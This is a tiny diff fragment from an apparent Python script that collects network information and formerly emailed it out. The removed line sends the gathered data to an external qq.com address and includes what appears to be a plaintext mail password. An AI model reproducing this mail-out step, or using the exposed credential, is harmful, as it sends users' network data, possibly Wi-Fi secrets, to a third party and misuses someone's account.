@@ -42,4 +42,3 @@ def get_net_info(networks_list):
 
 networks_list = get_networks()
 result = get_net_info(networks_list)
-send_mail("940546571@qq.com", "ltuboefioyepbbdc", result)
